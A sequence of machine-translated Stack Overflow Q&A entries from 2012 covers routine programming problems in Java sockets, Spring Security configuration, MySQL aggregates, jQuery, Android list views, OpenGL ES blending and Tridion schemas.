# java - 使用 Apache Commons 客户端 3.0.1 的 HTTPS 发布

> ID：10069055
> 
> 赞同：0
> 
> 时间：2012-04-09T04:57:20.090
> 
> 标签：java, xml, post, https

我需要开发一个可以将 https Post 以 xml 格式发送到 Web 服务的应用程序。对于基本设置，我使用了使用 HTTP 测试的 Apache Commons 客户端 3.0.1。但它不支持 HTTPS。这个 Apache Commons 是否有任何替代方案，可能有更新的版本。同样对于 Http 帖子，我发现 setRequestBody 已贬值。那是做https帖子的任何其他选择吗？网址连接不适用于 xml 格式数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T05:03:09.963

可能你想看看 HTMLUNIT，它是一个用于 java 程序的 http 客户端[http://htmlunit.sourceforge.net/](http://htmlunit.sourceforge.net/)

# java - 是否可以在同一台机器上运行套接字服务器和套接字客户端？

> ID：10069059
> 
> 赞同：19
> 
> 时间：2012-04-09T04:58:17.167
> 
> 标签：java, sockets, client-server, localhost

在 java 中可以创建一个套接字服务器和一个套接字客户端，是否可以运行一个套接字服务器的实例和一个从同一台机器上的套接字服务器接收数据的套接字/服务器客户端？

例如，套接字服务器在端口 60010 上运行，而套接字客户端在通过套接字连接到该端口的同一台机器上运行，或者我需要一台新机器并将其添加到我的网络中吗？如果它具有在 TCP/IP 层上运行的唯一 IP 地址和端口号。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-04-09T05:08:09.417

这是一个简单的可运行示例，可帮助您入门。它启动两个线程，一个带有 a `ServerSocket`，一个带有`Socket`连接。一个连续发送字符串，另一个打印它们。

您应该能够按原样运行此类。

```
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;

public class SocketTest {
    public static void main(String[] args) throws IOException {

        startServer();
        startSender();
    }

    public static void startSender() {
        (new Thread() {
            @Override
            public void run() {
                try {
                    Socket s = new Socket("localhost", 60010);
                    BufferedWriter out = new BufferedWriter(
                            new OutputStreamWriter(s.getOutputStream()));

                    while (true) {
                        out.write("Hello World!");
                        out.newLine();
                        out.flush();

                        Thread.sleep(200);
                    }

                } catch (UnknownHostException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public static void startServer() {
        (new Thread() {
            @Override
            public void run() {
                ServerSocket ss;
                try {
                    ss = new ServerSocket(60010);

                    Socket s = ss.accept();

                    BufferedReader in = new BufferedReader(
                            new InputStreamReader(s.getInputStream()));
                    String line = null;
                    while ((line = in.readLine()) != null) {
                        System.out.println(line);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T05:02:27.097

是的，您可以在同一台机器上拥有以下内容：

```
ServerSocket server = new ServerSocket(60010);
Socket client = server.accept(); 
```

别的地方：

```
Socket socket = new Socket("localhost", 60010);
PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
out.println("Hello server"); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T06:29:57.280

是的，这是完全可能的。每个操作系统都有一个[环回](http://en.wikipedia.org/wiki/Loopback)接口。您可以让多个客户端连接到计算机上的一台服务器。这种通信发生在环回接口上。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T05:02:46.703

是的，您可以在同一台机器上运行客户端和服务器。我一直这样做是为了发展。但是，如果您遇到问题，则某些路由器在将数据包转发回自己时遇到问题。尝试使用 localhost 而不是您的外部 IP 进行开发。

# asp.net-mvc-3 - Automapper：缺少 TypeMap 配置或不支持的映射

> ID：10069063
> 
> 赞同：1
> 
> 时间：2012-04-09T04:58:53.867
> 
> 标签：asp.net-mvc-3, automapper-2

```
// HomeController.cs
[AutoMap(typeof(Test), typeof(TestViewModel))]
public ActionResult Index()
{
    var tests = new List<Test>();
    tests.Add(new Test());
    return View(tests);
}

// Index.cshtml
@model IEnumerable<AutoMapperTest.Models.TestViewModel>

// AutoMapper Configuration
CreateMap<Test, TestViewModel>();

// Automapper configuration test is fine
[TestMethod]
public void Should_map_dtos()
{
    AutoMapperConfiguration.Configure();
    Mapper.AssertConfigurationIsValid();
} 
```

[AutoMapAttribute](http://lostechies.com/jimmybogard/2009/06/30/how-we-do-mvc-view-models/)取自这里。

如果操作返回“测试”，它会起作用。如果它返回“IEnumerable”，则不会（显然，视图更改为期望 TestViewModel 和 IEnumerable）。我究竟做错了什么？据我了解，我不需要显式映射 List 类型。

这可能有一个简单的答案，但在过去的两个小时里试图让它工作，所以非常感谢有人指出我的解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:38:42.560

从您的描述中我不清楚您是否更改了 AutoMapper 属性以包含列表：

```
[AutoMapper(typeof(List<Test>), typeof(List<TestViewModel>)] 
```

# java - 如何使用 servlet 获取 glassfish 根目录的真实路径

> ID：10069065
> 
> 赞同：0
> 
> 时间：2012-04-09T04:59:05.730
> 
> 标签：java, servlets

我想在服务器（比如 glassfish）根目录的运行时创建和放置文件。

如果我将使用 servlet 获得服务器根目录的真实路径（C:\glassfish3\glassfish\domains\domain1\docroot），那么我可以轻松地在该位置创建文件。

哪位大神知道的请告诉我！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-09T05:05:35.360

JSP：

```
String path = application.getRealPath("/"); 
```

小服务程序：

```
String path = getServletContext.getRealPath("/"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-03T11:53:25.753

您可以尝试以下操作：

```
System.getProperty("catalina.base"); 
```

您可以通过在调试模式下查看以下变量来找到其他属性。

```
Properties properties = System.getProperties(); 
```

# mysql - 当函数中涉及非数字值时，sql返回空白字符串？

> ID：10069066
> 
> 赞同：1
> 
> 时间：2012-04-09T04:59:06.050
> 
> 标签：mysql, sql, function, aggregate

我有一个简单的一般加权平均计算`SELECT`：

```
SELECT ROUND(SUM((G.UnitsAcademic*GD.Grade))/SUM(G.UnitsAcademic),3) AS 'GWA'
FROM Gradesheet G 
INNER JOIN GradeSheetDetail AS GD 
    ON GD.GradesheetId=G.GradesheetId 
```

但是，有些学生有非数字成绩（例如“无考试”）或空白成绩。上面的代码仍然计算并返回一个值。

当计算中涉及非数字值时，我希望它返回一个空白（“”）。SQL有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:17:22.570

所以首先：在 VARCHAR 字段中拥有应求和（或以任何方式进行数学处理）的数字在概念上是一个坏主意。最好将它们存储到数字字段中（并且在它们不适用的情况下使用不同的字段）。（事实上​​，我很惊讶 MySQL 甚至可以让你在 VARCHAR 上求和）

但我认为你不能改变它，所以试试这个：

```
select CASE WHEN SUM(GD.Grade) > 0
            THEN ' ' 
            ELSE SELECT ROUND(SUM((G.UnitsAcademic*GD.Grade))/SUM(G.UnitsAcademic),3) 
            END AS 'GWA' 
            FROM Gradesheet G 
            INNER JOIN GradeSheetDetail AS GD 
                  ON GD.GradesheetId=G.GradesheetId 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:23:24.583

尝试这个：

```
SELECT 
    CASE 
        WHEN 
            MAX(CASE WHEN GD.Grade = 'No Grade' OR GD.Grade = ' ' THEN 1 ELSE 0 END) = 1 THEN ' '
        ELSE 
            ROUND(SUM((G.UnitsAcademic*GD.Grade))/SUM(G.UnitsAcademic),3)  
    END AS 'GWA'  
FROM Gradesheet G  
INNER JOIN GradeSheetDetail AS GD  
      ON GD.GradesheetId = G.GradesheetId 
```

首先，您需要检查是否至少有一个非数字字段，如果“是”则返回空白，否则计算聚合。

# javascript - 检测没有文本框的击键？

> ID：10069070
> 
> 赞同：0
> 
> 时间：2012-04-09T04:59:20.653
> 
> 标签：javascript, html, hyperlink, window, internet-explorer-9

我必须使用 javascript 来制作链接，而不是出于几个不重要的原因，我希望它的行为就像我没有使用它一样。影响不是很容易，但我希望能够在单击打开新窗口时按住 shift 并在他们按住 ctrl 时在新选项卡中打开它。我该怎么做？此外，它必须与 IE9 兼容。

[编辑] 另外，这将在 iframe 中

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:12:03.170

我猜你想要这样的东西：

**JSFiddle**

[http://jsfiddle.net/MXuVY/3/](http://jsfiddle.net/MXuVY/3/)

**JavaScript**

```
var ctrlPressed = false;
$('#link').click(function () {
    var link = 'http://stackoverflow.com/';
    if (ctrlPressed) {
        window.open(link,'_blank');
    } else {
        window.location = link;
    }
    return false;
});
$(document).keydown(function (e) {
    if (e.keyCode === 17) {
        ctrlPressed = true;
    }
});
$(document).keyup(function (e) {
    if (e.keyCode === 17) {
        ctrlPressed = false;
    }
}); 
```

​</p>

**HTML**

```
<span id="link">Link to stackoverflow</span>​ 
```

​<strong>不带jQuery的版本

**JSFiddle**

[http://jsfiddle.net/MXuVY/6/](http://jsfiddle.net/MXuVY/6/)

**JavaScript**

```
function addEvent(el, eType, fn, uC) {
    if (el.addEventListener) {
        el.addEventListener(eType, fn, uC);
        return true;
    } else if (el.attachEvent) {
        return el.attachEvent('on' + eType, fn);
    } else {
        el['on' + eType] = fn;
    }
}

var ctrlPressed = false,
    a = document.getElementById('link'),
    link = 'http://stackoverflow.com/';

addEvent(a, 'click', function () {
    if (ctrlPressed) {
        window.open(link,'_blank');
    } else {
        window.location = link;
    }
    return false;
});
addEvent(document, 'keydown', function (e) {
    if (e.keyCode === 17) {
        ctrlPressed = true;
    }
});
addEvent(document, 'keyup', function (e) {
    if (e.keyCode === 17) {
        ctrlPressed = false;
    }
}); 
```

​</p>

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T05:00:47.500

将击键事件侦听器绑定到窗口或文档，并使用它的回调函数来执行您需要的任何操作。

如果您使用 jquery，则更容易制作更可靠的击键侦听器，恕我直言。[http://blog.cnizz.com/2008/10/27/javascript-key-listener/](http://blog.cnizz.com/2008/10/27/javascript-key-listener/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T05:09:06.557

所以，这就是你想要的：[***`http://jsfiddle.net/DerekL/V8yzF/show`***](http://jsfiddle.net/DerekL/V8yzF/show)

```
$("a").click(function(ev) {
    if (ev.ctrlKey) {                     //If ctrl
        window.open(this.attr("href"));
        retrun false;
    } else if (ev.shiftKey) {            //If shift
        window.open(this.attr("href"),"_blank", "width=400,height=300");
        retrun false;
    } else {                             //If nothing
        //do nothing
    }
});​ 
```

# java - Gridlayout 中的 JPanel 导致透明度问题

> ID：10069072
> 
> 赞同：1
> 
> 时间：2012-04-09T04:59:34.957
> 
> 标签：java, swing, transparency, alpha, grid-layout

我是 Java 新手，我似乎无法用半透明背景修复这个错误。

每当我更改面板的某些部分时，它都会绘制更改以及窗口的一些随机图片。

更清晰的错误图片

*   [http://shujin.homelinux.net/fong/Working.jpg](http://shujin.homelinux.net/fong/Working.jpg)

*   [http://shujin.homelinux.net/fong/Bugged.jpg](http://shujin.homelinux.net/fong/Bugged.jpg)

这是完整工作项目的链接，因此您可以清楚地看到错误。稍等一下，我的服务器加载速度很慢[http://fong.shujindesigns.net](http://fong.shujindesigns.net)

我制作了这个较小版本的错误，以便您进行测试。

```
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.event.MouseEvent;

public class Example1 extends JApplet implements MouseListener {

    Container Con = getContentPane();
    JPanel panel1 = new JPanel(new GridLayout(5, 5, 0, 0));
    JPanel[][] panel2 = new JPanel[5][5];
    JLabel[] label = new JLabel[25];
    Color color;
    int count = 0;

    public void init() {

        int col = 0;
        int row = 0;
        color = new Color(0.00f, 0.24f, 0.70f, 0.50f);

        for (int i = 0; i < 25; i++) {
            if (col > 4) {
                col = 0;
                row++;
            }
        label[i] = new JLabel("test");
        label[i].addMouseListener(this);
        panel2[col][row] = new JPanel();
        panel2[col][row].add(label[i]);
        color = new Color(0.00f, 0.24f, 0.70f, 0.20f);
        panel2[col][row].setBackground(color);
        label[i].setBorder(BorderFactory.createLineBorder(Color.red));
        panel1.add(panel2[col][row]);
        color = new Color(0.50f, 0.24f, 0.10f, 0.20f);
        panel1.setBackground(color);
        col++;
        }

        Con.add(panel1);
        panel1.setOpaque(false);
        label[5].setText("test2");
    }

    public void mouseEntered(MouseEvent e) {
    }

    public void mouseExited(MouseEvent e) {
    }

    public void mouseClicked(MouseEvent e) {
        label[5].setText("Test 3" + count);
        count++;
    }

    public void mousePressed(MouseEvent e) {  
    }

    public void mouseReleased(MouseEvent e) { 
    }

    public void mouseMoved(MouseEvent e) {
    }

    public void mouseDragged(MouseEvent e) {  
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T02:06:46.037

在 mouseClicked 事件中，添加“repaint()”

如果这不起作用，请尝试 invalidate()、repaint()

```
public void mouseClicked(MouseEvent e) {
    label[5].setText("Test 3" + count);
    count++;

    //revalidate();
    repaint();

} 
```

# jquery - jQuery 找不到自定义属性

> ID：10069077
> 
> 赞同：1
> 
> 时间：2012-04-09T05:00:10.027
> 
> 标签：jquery, html, ajax

jQuery 在下拉菜单上找不到我的自定义属性 我有一个类似的属性，仅在其上方一行，效果很好，但这一直给我一个未定义的属性。

***jQuery***

```
$('#admin_student_school_select').change('click',function(){
var school_student = $(this+':selected').attr('school_student');
$('#admin_student_content_details')
  .html(ajax_load)
  .load(loadUrl,"form_being_submitted=admin_page_list_student&school="+school_student);
}); 
```

***HTML***

```
<select id="admin_student_school_select">
    <option>Select a School</option>
    <option school_student="1">Riverside Community College</option>
    <option school_student="2">Victor Valley College</option>
    <option school_student="3">Cal State San Bernardino</option>
    <option school_student="4">Craffton College</option>
    <option school_student="5">San Bernardino Community</option>
</select> 
```

ajax 调用背后的脚本有效。我已经回应了结果。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:10:18.120

此行无效：

```
$('#admin_student_school_select').change('click',function(){ 
```

它是什么，一个`click`或一个`change`事件？！

* * *

**更新：**

`$(this+':selected')`不是一个有效的选择器...使用这个：

```
var school_student = $(':selected', this).attr('school_student'); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:11:04.657

我认为`$(this+':selected')`不会返回任何有用的东西。

尝试：

```
$('#admin_student_school_select').change(function(){
   var school_student = $(':selected', this).attr('school_student');
   // rest of your code
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T05:20:28.903

试试这个：

```
$('#admin_student_school_select').change(function(){
     var school_student = $(this).val();
});

<select id="admin_student_school_select">
    <option value="0">Select a School</option>
    <option value="1">Riverside Community College</option>
    <option value="2">Victor Valley College</option>
    <option value="3">Cal State San Bernardino</option>
    <option value="4">Craffton College</option>
    <option value="5">San Bernardino Community</option>
</select> 
```

# android - 如何使用android中的基本适配器在自定义列表视图中获取数组列表中的所有编辑文本值

> ID：10069079
> 
> 赞同：0
> 
> 时间：2012-04-09T05:00:17.230
> 
> 标签：android, android-listview

我通过 url 从服务器数据库中获取所有菜单名，我使用基本适配器将所有菜单名附加到 editext 自定义列表视图中。现在我将 Edittext 更改的值放入列表数组。现在我想存储 edittext 所有值，无论他是否更改菜单名称。例如：x，yz ... 来自数据库的菜单名称附加到 editext 现在我将菜单名称 y 更改为 b和 z 到 c 在 editext.now 我想要 [x,bc..] 值在arraylist 但现在我得到 b,c

```
 this is my code
            public View getView(int position, View convertView, ViewGroup parent) {
    ViewHolder holder;

    if (convertView == null) {
        holder = new ViewHolder();
        convertView = inflater.inflate(R.layout.editmainmenulist, null);
        holder.caption = (EditText) convertView
                .findViewById(R.id.editmaimenu);
        holder.caption1=(ImageView) convertView.findViewById(R.id.menuimage);
        convertView.setTag(holder);
    } else {
        holder = (ViewHolder) convertView.getTag();
    }
    //Fill EditText with the value you have in data source
    holder.caption.setText(itemnames[position]);//here only i append database menunames
    holder.caption.setId(position);
    holder.caption1.setImageBitmap(bmps[position]);

    //we need to update adapter once we finish with editing
    holder.caption.setOnFocusChangeListener(new OnFocusChangeListener() {
        public void onFocusChange(View v, boolean hasFocus) {
            if (!hasFocus){
                final int position = v.getId();
                final EditText Caption = (EditText) v;
                itemnames[position] = Caption.getText().toString();

                arr.add(Caption.getText().toString());//here only i think problem..please see any body can tell what i have mistake has been done

            }
        }    
    });     

    return convertView;
}
      }

           class ViewHolder {
EditText caption;
ImageView caption1;
      }

    class ListItem {
String caption;
     } 
```

我想要所有的edittext值，无论editext值是否改变。有目的的更新。我可以得到所有以前的菜单名。我想将旧菜单名更新为新菜单名

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:11:46.663

添加`TextChangedListener`到您`EditText`的`getView()`

**代码：**

```
holder.caption.addTextChangedListener(new TextWatcher()
{           
  @Override
   public void onTextChanged(CharSequence s, int start, int before, int count)
    {
     // TODO Auto-generated method stub         
    }           
    @Override
    public void beforeTextChanged(CharSequence s, int start, int count, int after)
    {
     // TODO Auto-generated method stub
     }
    @Override
    public void afterTextChanged(Editable s)
    {
    // TODO Auto-generated method stub
    String data =  holder.caption.getText().toString().trim();
    }
}); 
```

现在在需要时从 edittext 获取数据，onTextChanged、beforeTextChanged 或 afterTextChanged..

# spring-security - 无法在 Spring Security 3.05 中自定义用户服务

> ID：10069080
> 
> 赞同：0
> 
> 时间：2012-04-09T05:00:29.823
> 
> 标签：spring-security

请帮助解决我在 Spring Security 3.05 和 Tomcat7.0 中遇到的以下错误。我是 Spring Security 的新手，正在使用以下教程：带有 Spring Security 的简单 Web 应用程序：http: [//heraclitusonsoftware.wordpress.com/software-development/spring/simple-web-application-with-spring-security-part- 6/](http://heraclitusonsoftware.wordpress.com/software-development/spring/simple-web-application-with-spring-security-part-6/)

这是错误：

```
SEVERE: Exception sending context initialized event to listener instance of class org.springframework.web.context.ContextLoaderListener
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'daoAuthenticationProvider' defined in ServletContext resource [/WEB-INF/applicationContext-security.xml]: Initialization of bean failed; nested exception is org.springframework.beans.ConversionNotSupportedException: Failed to convert property value of type 'org.springframework.security.core.userdetails.memory.InMemoryDaoImpl' to required type 'org.springframework.security.userdetails.UserDetailsService' for property 'userDetailsService'; nested exception is java.lang.IllegalStateException: Cannot convert value of type [org.springframework.security.core.userdetails.memory.InMemoryDaoImpl] to required type [org.springframework.security.userdetails.UserDetailsService] for property 'userDetailsService': no matching editors or conversion strategy found
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:527)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:563)
    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:872)
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:423)
    at org.springframework.web.context.ContextLoader.createWebApplicationContext(ContextLoader.java:276)
    at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:197)
    at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:47)
    at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4723)
    at org.apache.catalina.core.StandardContext$1.call(StandardContext.java:5226)
    at org.apache.catalina.core.StandardContext$1.call(StandardContext.java:5221)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
    at java.util.concurrent.FutureTask.run(FutureTask.java:166)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722)
Caused by: org.springframework.beans.ConversionNotSupportedException: Failed to convert property value of type 'org.springframework.security.core.userdetails.memory.InMemoryDaoImpl' to required type 'org.springframework.security.userdetails.UserDetailsService' for property 'userDetailsService'; nested exception is java.lang.IllegalStateException: Cannot convert value of type [org.springframework.security.core.userdetails.memory.InMemoryDaoImpl] to required type [org.springframework.security.userdetails.UserDetailsService] for property 'userDetailsService': no matching editors or conversion strategy found
    at org.springframework.beans.BeanWrapperImpl.convertForProperty(BeanWrapperImpl.java:471)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.convertForProperty(AbstractAutowireCapableBeanFactory.java:1363)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1322)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1076)
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:517)
    ... 19 more
Caused by: java.lang.IllegalStateException: Cannot convert value of type [org.springframework.security.core.userdetails.memory.InMemoryDaoImpl] to required type [org.springframework.security.userdetails.UserDetailsService] for property 'userDetailsService': no matching editors or conversion strategy found
    at org.springframework.beans.TypeConverterDelegate.convertIfNecessary(TypeConverterDelegate.java:291)
    at org.springframework.beans.TypeConverterDelegate.convertIfNecessary(TypeConverterDelegate.java:155)
    at org.springframework.beans.BeanWrapperImpl.convertForProperty(BeanWrapperImpl.java:461)
    ... 23 more 
```

我的 spring 安全配置并在下面列出：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans:beans xmlns="http://www.springframework.org/schema/security"
    xmlns:beans="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.springframework.org/schema/beans 
                    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
                    http://www.springframework.org/schema/security 
                    http://www.springframework.org/schema/security/spring-security-3.0.xsd">

    <!--<global-method-security secured-annotations="disabled">
    </global-method-security>

<http auto-config="true">
        <intercept-url pattern="/login.jsp" filters="none" />
            <intercept-url pattern="/**" access="ROLE_USER" />
        <form-login login-page="/login.jsp" 
                default-target-url="/home.htm" always-use-default-target="false" 
                authentication-failure-url="/login.jsp?authfailed=true"/>
            <logout invalidate-session="true" logout-url="/logout.htm"
                logout-success-url="/login.jsp?loggedout=true"/>
    <session-management session-fixation-protection="newSession">
        <concurrency-control max-sessions="1" error-if-maximum-exceeded="true"/>
    </session-management>

    </http>
<authentication-manager>
    <authentication-provider>
        <user-service id="userDetailsService">
            <user name="username" password="password" authorities="ROLE_USER, ROLE_ADMIN" />
            <user name="test" password="test" authorities="ROLE_USER" />
        </user-service>
    </authentication-provider>
        </authentication-manager>-->
        <beans:bean id="sessionRegistry"
        class="org.springframework.security.concurrent.SessionRegistryImpl" />

    <beans:bean id="defaultConcurrentSessionController"
        class="org.springframework.security.concurrent.ConcurrentSessionControllerImpl">
        <beans:property name="sessionRegistry" ref="sessionRegistry" />
        <beans:property name="exceptionIfMaximumExceeded"
            value="true" />
    </beans:bean>

    <beans:bean id="daoAuthenticationProvider"
        class="org.springframework.security.providers.dao.DaoAuthenticationProvider">
        <beans:property name="userDetailsService" ref="userDetailsService" />
        <beans:property name="hideUserNotFoundExceptions"
            value="false" />
    </beans:bean>

    <beans:bean id="authenticationManager"
        class="org.springframework.security.providers.ProviderManager">
        <beans:property name="providers">
            <beans:list>
                <beans:ref local="daoAuthenticationProvider" />
            </beans:list>
        </beans:property>
        <beans:property name="sessionController"
            ref="defaultConcurrentSessionController" />
    </beans:bean>

    <beans:bean id="customAuthenticationProcessingFilter"
        class="org.springframework.security.ui.webapp.AuthenticationProcessingFilter">
        <beans:property name="defaultTargetUrl" value="/home.htm" />
        <beans:property name="authenticationManager" ref="authenticationManager" />
        <beans:property name="authenticationFailureUrl" value="/login.jsp?authfailed=true" />
        <beans:property name="allowSessionCreation" value="true" />
    </beans:bean>

    <global-method-security secured-annotations="disabled">
    </global-method-security>

    <beans:bean id="myAuthenticationEntryPoint"
        class="org.springframework.security.ui.webapp.AuthenticationProcessingFilterEntryPoint">
        <beans:property name="loginFormUrl" value="/login.jsp" />
    </beans:bean>

    <http entry-point-ref="myAuthenticationEntryPoint" auto-config="false">
        <intercept-url pattern="/login.jsp" filters="none" />
        <intercept-url pattern="/admin.htm" access="ROLE_ADMIN" />
        <intercept-url pattern="/**" access="ROLE_USER" />
        <logout invalidate-session="true" logout-url="/logout.htm"
            logout-success-url="/login.jsp?loggedout=true" />

                            <custom-filter position="FORM_LOGIN_FILTER" 
                            ref="customAuthenticationProcessingFilter"/>
    </http>
        <authentication-manager>
            <authentication-provider>
                            <user-service id="userDetailsService">
                                    <user name="admin" password="admin" authorities="ROLE_USER, ROLE_ADMIN" />
                                    <user name="username" password="password" authorities="ROLE_USER" />
                                    <user name="test" password="test" authorities="ROLE_USER" />
                            </user-service>
                    </authentication-provider>
        </authentication-manager>

</beans:beans> 
```

问候， 纳齐尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T08:08:30.553

`org.springframework.security.userdetails.UserDetailsService`来自 Spring Security 2.x，在 Spring Security 3.x 中它的名字是`org.springframework.security.core.userdetails.UserDetailsService`.

因此，您在类路径中有一些 Spring Security 2.x jar。

# graphics - 带有点精灵的 OpenGL ES 叠加混合模式

> ID：10069082
> 
> 赞同：0
> 
> 时间：2012-04-09T05:01:01.613
> 
> 标签：graphics, opengl-es

我正在尝试在点精灵上模拟 Photoshop 的叠加混合模式。这在 OpenGL ES 中可行吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T15:43:28.157

编辑 - 这可能会帮助你：

请注意：我*不*相信下面的代码；我在 powervr 论坛上找到它：[http ://www.imgtec.com/forum/forum_posts.asp?TID=949](http://www.imgtec.com/forum/forum_posts.asp?TID=949)

```
uniform sampler2D s_renderTexture;
uniform sampler2D s_overlayMap;
varying mediump vec2 myTexCoord;

void main()

{
     //Get the Texture colour values
     lowp vec3 baseColor = texture2D(s_renderTexture, myTexCoord).rgb;
     lowp float overlayTexture = texture2D(s_overlayMap, myTexCoord).r;
     lowp vec3 finalMix = baseColor + (overlayTexture - 0.5) * (1.0 - abs(2.0 * baseColor - 1.0));

     //Set the Fragments colour

     gl_FragColor = vec4( finalMix, 1.0 );

} 
```

当然，在渲染点精灵之前调用它：

```
glEnable(GL_BLEND);
glBlendFunc(GL_ONE, GL_ONE); 
```

这应该导致添加剂混合。

以下是不同混合模式组合的视觉参考：http: [//zanir.wz.cz/ ?p=60&lang=en](http://zanir.wz.cz/?p=60&lang=en)

这是一个旧页面，但它是一个很好的参考。

有关 opengl-es 混合的更多信息：[http ://www.khronos.org/opengles/sdk/docs/man/xhtml/glBlendFunc.xml](http://www.khronos.org/opengles/sdk/docs/man/xhtml/glBlendFunc.xml)

# android - 如何以编程方式在 Android 中显示 twitter 提要？

> ID：10069083
> 
> 赞同：0
> 
> 时间：2012-04-09T05:01:10.167
> 
> 标签：android, twitter

如何以编程方式在 Android 中显示 twitter 提要？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-09T05:37:29.140

请更具体地说明您想做什么（也许您的动机是什么），您已经知道/尝试了什么以及您卡在哪里。它使回答您的问题更容易。

话虽如此，我看到您的应用程序应该做的两个主要方面：

1.  获取给定提要的推文
2.  显示它们

我想构建 Android 应用程序和用户界面的工作原理在某种程度上是您已经知道的（如果不是，这是一个单独的问题）。

所以缺少的是一种与推特服务器通信并检索推文的方法。对于这样的任务（不仅是 twitter），通常定义了 API，您可以找到库来为您完成大部分艰苦的工作。

在这种情况下，对“twitter api android”的网络搜索将引导您到 twitter 的[可用 Twitter 库列表](https://dev.twitter.com/docs/twitter-libraries)，按语言排序。Android 编程通常使用 Java 完成。在列表中，您可以找到三个可供选择的 Java 库，其中一个明确提到与 Android 兼容：[twitter4j](http://twitter4j.org)（在 Apache 许可下）。

玩得开心。“代码示例”部分可能也值得一看。

编辑：[Twitter API ME](http://kenai.com/projects/twitterapime/pages/Home)也与 android 兼容（并获得 GPL / LGPL 许可）。还有[TwAPIme](https://play.google.com/store/apps/details?id=com.twapime.app)，一个展示其功能的应用程序，提供源代码（下载链接和许可证请参见 Google Play 中描述的末尾）。

# tridion - 在 SDL Tridion 2011 SP1 中使用核心服务创建模式

> ID：10069085
> 
> 赞同：4
> 
> 时间：2012-04-09T05:01:40.760
> 
> 标签：tridion

我正在使用 SDL Tridion 2011 SP1 中的核心服务创建架构。在创建 Schema 时，我使用了 Schema 的自定义命名空间 URI。一般我们直接通过 Tridion CME 创建 Schema 时，会得到一个自动生成的命名空间 URI，以`uuid:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`

我已经使用此代码创建了一个模式：

```
Tridion.ContentManager.CoreService.Client.SchemaData schemas = new SchemaData
{
    Title = "coreservicesschema3",
    Description = "coreservicesschema",
    Id = "tcm:0-0-0",
    LocationInfo = new LocationInfo
    {
        OrganizationalItem =
            new LinkToOrganizationalItemData { IdRef = "tcm:7-18-2" }
    },

    RootElementName = "Content",
    NamespaceUri = "customnamespaceuri",
    Xsd = xsd.ToString(SaveOptions.None)
};
schemas = (SchemaData)client.Create(schemas, new ReadOptions());
Response.Write("<BR>" +"new schema id"+ schemas.Id);
Response.Write("<BR>" + "new schema Name" + schemas.Title);
//schema created 
```

谁能指出如何使用默认命名空间 URI 创建模式？

谢谢
